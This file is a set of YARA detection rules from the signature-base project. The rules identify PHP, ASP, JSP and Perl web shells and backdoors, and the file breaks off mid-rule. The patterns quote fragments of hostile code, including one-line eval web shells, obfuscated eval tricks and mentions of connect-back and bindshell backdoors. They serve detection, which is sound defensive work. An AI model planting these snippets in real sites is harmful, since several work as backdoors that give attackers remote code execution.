rule SIGNATURE_BASE_Webshell_Dev_Core {
    meta:
		description = "Web shells - generated from file dev_core.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3349-L3367"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "55ad9309b006884f660c41e53150fc2e"
		logic_hash = "b3c7a9bdaa7e5bf76df9ffba94157777c32199edeaa1c8745e9400d138abc267"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {" fullword
		$s9 = "setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);" fullword
		$s10 = "$_SESSION['code'] = _REQUEST(sprintf(\"%s?%s\",pack(\"H*\",'6874"
		$s11 = "if (preg_match(\"/^HTTP\\/\\d\\.\\d\\s([\\d]+)\\s.*$/\", $status, $matches))"
		$s12 = "eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_C"
		$s15 = "if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Php {
    meta:
		description = "Web shells - generated from file pHp.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3368-L3385"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b0e842bdf83396c3ef8c71ff94e64167"
		logic_hash = "a943f3b0d1d56194e250c7cf3e05b2bfec7b29f91ef56085d645efa3fe8995c9"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if(is_readable($path)) antivirus($path.'/',$exs,$matches);" fullword
		$s1 = "'/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|arr"
		$s13 = "'/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(\\w+)\\[(.*)\\]\\s*"
		$s14 = "'/(include|require|include\\_once|require\\_once)+\\s*\\(\\s*[\\'|\\\"](\\w+"
		$s19 = "'/\\$\\_(\\w+)(.*)(eval|assert|include|require|include\\_once|require\\_once"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Pppp {
    meta:
		description = "Web shells - generated from file pppp.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3386-L3401"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cf01cb6e09ee594545693c5d327bdd50"
		logic_hash = "bd09fc2ec88bea83b16e63afafa3d5f74f119a81046a663322f5b396b48da135"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Mail: chinese@hackermail.com" fullword
		$s3 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "
		$s6 = "Site: http://blog.weili.me" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Code {
    meta:
		description = "Web shells - generated from file code.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3402-L3419"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a444014c134ff24c0be5a05c02b81a79"
		logic_hash = "5ae053a9afc1f720c56304c434cd89861e1df4060b7d813921e7f85978227020"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<a class=\"high2\" href=\"javascript:;;;\" name=\"action=show&dir=$_ipage_fi"
		$s7 = "$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO"
		$s10 = "if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_"
		$s14 = "Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:"
		$s17 = "<a href=\"javascript:;;;\" name=\"{return_link}\" onclick=\"fileperm"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Jspyyy {
    meta:
		description = "Web shells - generated from file jspyyy.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3420-L3433"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b291bf3ccc9dac8b5c7e1739b8fa742e"
		logic_hash = "0afe45556aa7b562672cc4b609cf001aaa617b03028322abac6524f666b069e1"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Xxxx {
    meta:
		description = "Web shells - generated from file xxxx.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3434-L3447"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5bcba70b2137375225d8eedcde2c0ebb"
		logic_hash = "e14cc1eaf357389ca58193c77ce2f54774aebb42be9df15f12415df356c7ed42"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php eval($_POST[1]);?>  " fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Jjjsp3 {
    meta:
		description = "Web shells - generated from file JJjsp3.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3448-L3461"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "949ffee1e07a1269df7c69b9722d293e"
		logic_hash = "44889540effa2f71889e7f6d0c5d12486e256d83b9230c4902d56f6a59b7939b"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!S"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_PHP1 {
    meta:
		description = "Web shells - generated from file PHP1.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3462-L3477"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "14c7281fdaf2ae004ca5fec8753ce3cb"
		logic_hash = "1c5eb355455c7fbd2b74d91f78e1d77f460dfeb4fe0ee65f18aa1453337b67a0"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>" fullword
		$s2 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316" fullword
		$s3 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Jjjsp2 {
    meta:
		description = "Web shells - generated from file JJJsp2.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3478-L3494"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5a9fec45236768069c99f0bfd566d754"
		logic_hash = "47dca67c7a01035996d032cb3871da5532aea81ab6570c93c4a6b148fd95e9f9"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z"
		$s8 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ"
		$s10 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData()"
		$s11 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase("

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Radhat {
    meta:
		description = "Web shells - generated from file radhat.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3495-L3508"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "72cb5ef226834ed791144abaa0acdfd4"
		logic_hash = "28d4d380b25da05a3be439bad72725fa49c947535dfeb5c24994a849c0592b81"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "sod=Array(\"D\",\"7\",\"S"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Asp1 {
    meta:
		description = "Web shells - generated from file asp1.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3509-L3523"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b63e708cd58ae1ec85cf784060b69cad"
		logic_hash = "6c76c5388825e29d333096d4cfa3782b7776f31b206a0ed5a8809428d698778b"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword
		$s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Php6 {
    meta:
		description = "Web shells - generated from file php6.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3524-L3539"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ea75280224a735f1e445d244acdfeb7b"
		logic_hash = "495dc6c6769b8605ea946c012ad0ebb54685e7e91afd383027640753d90c6b3f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "array_map(\"asx73ert\",(ar"
		$s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword
		$s4 = "shell.php?qid=zxexp  " fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Xxx {
    meta:
		description = "Web shells - generated from file xxx.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3540-L3553"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0e71428fe68b39b70adb6aeedf260ca0"
		logic_hash = "837ed266af8a65ac683be39c32509df34bc8041b336a71c12700ca73bf210b4d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Getpostphp {
    meta:
		description = "Web shells - generated from file GetPostpHp.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3554-L3567"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "20ede5b8182d952728d594e6f2bb5c76"
		logic_hash = "e75f66200593c3fdaadf1881235847f6c3f3caadcb7ffe13e8b01bce5f922702"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Php5 {
    meta:
		description = "Web shells - generated from file php5.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3568-L3581"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cf2ab009cbd2576a806bfefb74906fdf"
		logic_hash = "280be378bc6cf52ef9454083180015ed00f9d0bc936620a4105c34c3a3002383"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Asp {
    meta:
		description = "Web shells - generated from file Asp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3600-L3615"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "32c87744ea404d0ea0debd55915010b7"
		logic_hash = "dd2e9f753e8fa781c28c2d5bb9336bb3f39ed8a496bd89eb54bc1812ef512ab5"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")" fullword
		$s2 = "Function MorfiCoder(Code)" fullword
		$s3 = "MorfiCoder=Replace(Replace(StrReverse(Code),\"/*/\",\"\"\"\"),\"\\*\\\",vbCrlf)" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Perlbot_Pl {
    meta:
		description = "Semi-Auto-generated  - file perlbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "378cb0e4-2069-50b7-ab3e-5a81055e9983"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3619-L3630"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7e4deb9884ffffa5d82c22f8dc533a45"
		logic_hash = "784980d620e71fb0cf5aed9ef8bd171a8f50d850bc782645575070b75c42e426"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "my @adms=(\"Kelserific\",\"Puna\",\"nod32\")"
		$s1 = "#Acesso a Shel - 1 ON 0 OFF"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Php_Backdoor_Php {
    meta:
		description = "Semi-Auto-generated  - file php-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "aca53071-f793-538d-bbeb-34469cdb4d1f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3631-L3643"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
		logic_hash = "acab82b40760b45d49da51953f78c69166955de54918634c9bfe394208cdbb56"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "http://michaeldaw.org   2006"
		$s1 = "or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win"
		$s3 = "coded by z0mbie"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Liz0Zim_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_Php {
    meta:
		description = "Semi-Auto-generated  - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e91114ce-18f9-51cd-b41c-b796960ea4fe"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3644-L3656"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
		logic_hash = "a0606dad4474579354709fe6306d15427afc4dec8ad6760a0ee9e91c86c23e4d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt"
		$s1 = "Liz0ziM Private Safe Mode Command Execuriton Bypass"
		$s2 = "echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Nshell__1__Php_Php {
    meta:
		description = "Semi-Auto-generated  - file Nshell (1).php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44e8b6c5-6f41-5c37-a083-26acedd91956"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3657-L3668"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "973fc89694097a41e684b43a21b1b099"
		logic_hash = "53c7cd24c4eddbded1b4c16fd2758bdf66c0bbe396e487a56d56fc053cf3cc1a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($"
		$s1 = "if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Shankar_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file shankar.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "0c8ab3eb-574b-5e5a-8117-4efecef94f83"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3669-L3681"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "6eb9db6a3974e511b7951b8f7e7136bb"
		logic_hash = "58b365206c18b8394cf1e03b71b8e47be10bc933bc2c05b7b03b7dad94f6d6b8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$sAuthor = "ShAnKaR"
		$s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input"
		$s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b"

	condition:
		1 of ($s*) and $sAuthor
}
rule SIGNATURE_BASE_Casus15_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file Casus15.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ba6748a2-fb80-5eda-816c-155bab9285e5"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3682-L3694"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5e2ede2d1c4fa1fcc3cbfe0c005d7b13"
		logic_hash = "6ee7a07163d33ca329d3be2084406629711db14db4605e8413ee963eb0f9d5a7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na"
		$s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'"
		$s3 = "value='Calistirmak istediginiz "

	condition:
		1 of them
}
rule SIGNATURE_BASE_Small_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file small.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cf4fb88f-a312-560d-be0b-b55bfcb889be"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3695-L3707"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "fcee6226d09d150bfa5f103bee61fbde"
		logic_hash = "e0444aa604e8956d423037b70b9476f5653503055d0f1bc875d43de144ce5c44"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "$pass='abcdef1234567890abcdef1234567890';" fullword
		$s2 = "eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1"
		$s4 = "@ini_set('error_log',NULL);" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Shellbot_Pl {
    meta:
		description = "Semi-Auto-generated  - file shellbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "07c145b1-c9f7-564a-b354-a6d2072f380c"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3708-L3722"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b2a883bc3c03a35cfd020dd2ace4bab8"
		logic_hash = "5db224e4fe8608bb53f044ca6c0361dc66cadd58c6d4ea5ab4f8ae14ebde0e6e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "ShellBOT"
		$s1 = "PacktsGr0up"
		$s2 = "CoRpOrAtIoN"
		$s3 = "# Servidor de irc que vai ser usado "
		$s4 = "/^ctcpflood\\s+(\\d+)\\s+(\\S+)"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Fuckphpshell_Php {
    meta:
		description = "Semi-Auto-generated  - file fuckphpshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "010db63b-ff72-5f97-8651-a1c7851471ff"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3723-L3736"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "554e50c1265bb0934fcc8247ec3b9052"
		logic_hash = "0c993960b4ca880b818c7b7ba726479ed1c64c46ef8ca82d3c990d69ebe43f42"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$succ = \"Warning! "
		$s1 = "Don`t be stupid .. this is a priv3 server, so take extra care!"
		$s2 = "\\*=-- MEMBERS AREA --=*/"
		$s3 = "preg_match('/(\\n[^\\n]*){' . $cache_lines . '}$/', $_SESSION['o"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Ngh_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file ngh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "2d8ff3c1-d6b3-57ce-8213-232b376dbd05"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3737-L3751"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c372b725419cdfd3f8a6371cfeebc2fd"
		logic_hash = "c794b216bafdaecf5bd138cc8c7552efbb8c3c571a441489d02a19793a4c294f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Cr4sh_aka_RKL"
		$s1 = "NGH edition"
		$s2 = "/* connectback-backdoor on perl"
		$s3 = "<form action=<?=$script?>?act=bindshell method=POST>"
		$s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Jsp_Reverse_Jsp {
    meta:
		description = "Semi-Auto-generated  - file jsp-reverse.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4953b230-4cd9-55d6-a3cb-8d3713e7fb0c"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3752-L3764"
